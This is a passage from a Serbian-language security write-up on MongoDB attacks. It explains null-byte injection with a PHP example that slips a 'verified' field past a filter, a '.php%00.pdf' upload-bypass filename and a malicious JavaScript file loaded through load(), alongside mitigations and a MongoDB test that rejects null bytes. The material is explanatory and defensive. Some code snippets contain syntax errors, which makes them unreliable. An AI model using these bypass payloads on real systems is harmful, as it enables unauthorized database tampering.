Napadi koji eksploatišu ovu ranjivost zloupotrebljavaju komponentu poznatu pod nazivom MongoDB Handler. Handler preuzima operacije iz izvorne datotekte i kreira odgovarajuće dokumente (redove) u ciljnoj MongoDB bazi podataka. Napad koristi nešto što se zove null-byte injection da zaobiđe Handler i izazove buffer overflow. Null byte karakter je karakter koji služi da se terminiraju stringovi. Primer takvih karaktera jeste <b>%00</b> kod URI-a, ili <b>0x00</b> kod heksadecimalnih zapisa. Ubacivanjem ovakvih karaktera bi se zaobišli filteri za proveru ispravnosti podataka, aplikacije bi se zbunile oko terminiranja stringova, a zatim bi bile izmanipulisane da izvršavaju različite akcije.

Sledi jednostavan primer: napadač želi da okači malicioznu datoteku <i>malicious.php</i>, međutim, jedina ekstenzija koja je dozvoljena za upload-ovanje je .pdf. Napadač bi onda preimenovao datoteku u <i>malicious.php%00.pdf</i>. Aplikacija bi pročitala .pdf ekstenziju, validirala upload, i odbacila kraj stringa zbog ubačenog null bajta, čime bi napadač uspešno okačio maliciozni fajl.

Većina današnjih aplikacija su implementirane pomoću programskih jezika višeg nivoa. Takve aplikacije zahtevaju obradu koda na sistemskom nivou, što se obično postiže korišćenjem C ili C++ programskog jezika.

Null bajtovi u C/C++ jeziku predstavljaju terminaciju stringa ili delimiter (što znači da procesiranje stringa mora momentalno da se zaustavi). Svi bajtovi nakon delimitera se ignorišu. Ako string izgubi svoj null karakter, dužina stringa postaje nepoznata sve dok memorijski pokazivač ne naiđe na sledeći null bajt.

Nekoliko jezika visokog nivoa tretira null bajtove kao placeholder-e za dužinu stringa, jer oni nemaju specijalno značenje u njihovom kontekstu. Razlika u interpretaciji omogućava null bajtovima da se sa lakoćom ubace u aplikacije kako bi manipulisali njihovim ponašanjem.

U MongoDB-u, null byte injection bi mogao da dozvoli napadačima da pristupe i menjaju polja u bazi kojoj inače nebi imali pristup. Kod koji sledi dozvoljava korisnicima da dodaju proizvoljne objekte u kolekciju tako što bi prosledili niz objekata u GET komandu. Međutim, ne dozvoljava im da menjaju polje "verified".

<pre>
$con = new Mongo("mongodb://localhost);

$db = $con->selectDB("example)->
            selectCollection("students");

$_GET("student") = array(
    "name" => "Bilal",
    "age" => 100,
    <span style="color:red"><b>"verified" => true</b></span>
);

unset($_GET["student]["verified"]);
$db->insert($GET["student"], true);
</pre>

Ako pogledamo bazu nakon izvršavanja prethodnog koda, možemo videti da je objekat kreiran unutar kolekcije "population", sa svim poljima izuzev polja "verified".

![Slika3](/Dijagrami/NodeJsMongo/bufferOverflow1.jpg)

Ako ubacimo null bajt u ključ niza, možemo zaobići proveru i dozvoliti polju "verified" da bude skladišteno u MongoDB-u.

<pre>
$con = new Mongo("mongodb://localhost);

$db = $con->selectDB("example)->
            selectCollection("students");

$_GET("student") = array(
    "name" => "Bilal",
    "age" => 100,
    <span style="color:red"><b>"verified".chr(0)."ignored" => true</b></span>
);

unset($_GET["student]["verified"]);
$db->insert($GET["student"], true);
</pre>

MongoDB će odbaciti sve nakon null bajta, a proverom kolekcije vidimo da je polje "verified" sada popunjeno.

![Slika4](/Dijagrami/NodeJsMongo/bufferOverflow2.jpg)

Forsiranjem zaobilaska provera može se tehnički dozvoliti napadačima da ubace bilo kakav kod, koji bi onda bio skladišten u MongoDB-u, i kasnije izvršavan po želji. Većina napada koji su se u prošlosti desili su se sastojali od toga da su napadači koristili specijalno kreirane upite (gde su neki sadržali regularne izraze) da izazovu denial of service (DoS).

#### Mitigacije
Buffer Overflow ranjivost u MongoDB-u je odstranjena od strane MongoDB tima tako što su dodali dodatne provere na <b>arrayToObject</b>, koji konvertuje niz u jedan dokument. Novododate provere su suštinski veoma jednostavne: polja u kojima se čuvaju ključevi ne smeju dozvoliti da se u njima nalaze null bajtovi, i <b>arrayToObject</b> mora proizvesti grešku kada neki ključ sadrži null bajt.

Sledi prikaz test skripte napisane u JavaScript-u koja proverava da li arrayToObject operator proizvodi grešku kada ključ sadrži null bajt. Skripta se može naći na github stranici mongo projekta[[9]](#reference).

![Slika5](/Dijagrami/NodeJsMongo/bufferOverflow3.jpg)

Skripta definiše četiri testna slučaja, gde se svaki prosleđuje assertErrorCode() funkciji zajedno sa kodom greške. Svaki test se sastoji od agregacionong pipeline-a koji koristi $replaceWith operator, kome se prosleđuje $literal niz, koji sadrži parove ključ-vrednost. Prvi test prosleđuje niz koji sadrži ključ sa null bajtom (“a\0b”), dok drugi test prosleđuje objekat koji sadrži ključ sa null bajtom ({k: “a\0b”, v: “blah”}). Treći i četvrti testovi su slični, ali takođe poseduju $out fazu koja rezultat upisuje u kolekciju.

Funkcija assertErrorCode() proverava da li data operacija nad kolekcijum proizvodi grešku sa odgovarajućim kodom. U ovom slučaju, kodovi su 4940400 i 4940401. 4940400 odgovara slučaju gde ključ sadrži null bajt, dok 4940401 odgovara slučaju u kom je ključ tipa string, ali sadrži null bajt.

Sledi prikaz dela koda na serveru koji implementira logiku koja konvertuje BSON u JSON.

![Slika6](/Dijagrami/NodeJsMongo/bufferOverflow4.jpg)

Prvo se porede prvi element u valArray nizu sa BSONType::String konstantom, gde se proverava da li je element tipa string. Nakon toga se dobavlja vrednost stringa prvog elementa i uz pomoć find() metode proverava da li on sadrži null bajt (“\0”). Ako sadrži, baciće exception sa porukom “Key field cannot contain an embedded null byte”. Drugi deo koda baca isti exception ali sa drugim kodom greške, gde se ključ i vrednost ne dobavljaju iz niza, već se prosleđuju kao odvojeni parametri.

#### Stablo napada
![Dijagram](/Dijagrami/NodeJsMongo/BufferOverflowAttackTree.jpg)

### JavaScript File Inclusion
JavaScript File Inclusion je još jedan vid injection-a. Korisnici imaju opciju da često korišćene delove koda izdvoje u datoteku i učitaju u MongoDB bazu podataka. Takve vrste datoteka se mogu jednostavno otvoriti, a njihov sadržaj izvršiti, kada god je to potrebno. Međutim, u nekim slučajevima neautorizovani korisnici su u stanju da zloupotrebe ovu funkcionalnost. Napadači mogu ubaciti datoteku koja sadrži maliciozni kod i potencijalno da načine ozbiljnu štetu bazi.

#### Opis napada
Uzmimo kao primer sistem za upravljanje bolnicom. Pretpostavimo da imamo datoteku pod nazivom hackedView. Potrebno je izvršiti dva koraka: da datoteka uspostavi vezu sa MongoDB bazom podataka, i da izvrši insert statement. Sledi isečak koji je zaslužan za učitavanje datoteke u MongoDB sistem.

<pre>
MongoDB Enterprise >load("hackedView.js")
true
MongoDB Enterprise >
</pre>

S obzirom da kod koji je napisan u datoteci nije validiran, biće izvršen bez ikakvih problema. Ovim vidimo da je JavaScript file inclusion potencijalno veoma opasan za baze podataka, jer može dovesti do unosa štetnih podataka u njih.

Sledi prikaz sadržaja maliciozne datoteke.

<pre>
db = connect("localhost:27020/example");
db.hasckedView.insert({"Success":"1"});
print("File Inclusion Successful");
</pre>

Rezultat izvršavanja koda koji se nalazi u datoteci se može videti u isečku ispod.

<pre>
MongoDB Enterprise >load("hackedView.js")
Connecting to: localhost:27020/example
File Inclusion Successful
true
</pre>

#### Mitigacije
Postoje različite tehnike i mehanizmi za sprečavanje napada koji koriste JavaScript File Inclusion. Neke od smernica koje pomažu pri povećanju bezbednosti sistema a koje su primenljive u većini situacija jesu adekvatno i dovoljno detaljno testiranje, povećavanje svesti developera o važnosti implementacije bezbednog sistema, vođenje računa o bezbednosnim aspektima sistema još od ranih faza dizajniranja aplikacije, poštovanje dobrih praksi kod kodiranja, adekvatna dodela privilegija i njihova izolacija, kao i regularno skeniranje sistema. Dobra praksa je i poštovanje principa najmanje privilegije, odnosno pobrinuti se da svaki korisnik poseduje samo one privilegije koju su mu zaista i neophodne kako bi obavio operacije koje su mu namenjene. Posebno je važno onemogućiti korisniku da proizvoljno izvršava JavaScript kod. Pored toga, od izuzetnog značaja je konstantan monitoring, i postojanje sistema za detekciju napada i propusta.

Od konkretnih mitigacija, jedna od mogućnosti jeste celokupna zabrana izvršavanja JavaScript koda na serverskoj strani. To se može postići ako se <i>mongod</i> instanci prosledi <i>noscripting</i> opcija na komandnoj liniji, ili ako se opcija <i>security.javascriptEnabled</i> postavi na false u konfiguracionom fajlu. Detaljnije uputsvo se može pronaći u dokumentaciji za MongoDB[[10]](#reference). Ovo može biti dobro rešenje u slučaju da serveru zaista nije neophodno da izvršava JavaScript kod kako bi ispunio svoje funkcionalnosti. Pored toga, adekvatna validacija datoteka koje se prosleđuju je takođe pogodan način da se sistem zaštiti, kao i implementacija autentifikacije i autorizacije. Na kraju, korektna konfiguracija mreže isto može sprečiti neautorizovan pristup.

#### Stablo napada
![Dijagram](/Dijagrami/NodeJsMongo/JavaScriptFileInclusionAttackTree.jpg)

# Reference
[1] https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-davis.pdf

[2] https://link.springer.com/article/10.1007/s10207-020-00537-0

[3] https://dl.acm.org/doi/pdf/10.1145/3488932.3523262

[4] https://github.com/ossf/package-analysis

[5] https://gitlab.com/apparmor/apparmor

[6] https://www.researchgate.net/profile/Afsana-Brishty/publication/352666129_A_Survey_on_Detection_and_Prevention_of_SQL_and_NoSQL_Injection_Attack_on_Server-side_Applications/links/60dc3894458515d6fbeb1b90/A-Survey-on-Detection-and-Prevention-of-SQL-and-NoSQL-Injection-Attack-on-Server-side-Applications.pdf

[7] https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/dissecting-buffer-overflow-attacks-in-mongodb/

[8] https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3172769

[9] https://github.com/mongodb/mongo/commit/1772b9a0393b55e6a280a35e8f0a1f75c014f301?diff=split

[10] https://www.mongodb.com/docs/v5.3/core/server-side-javascript/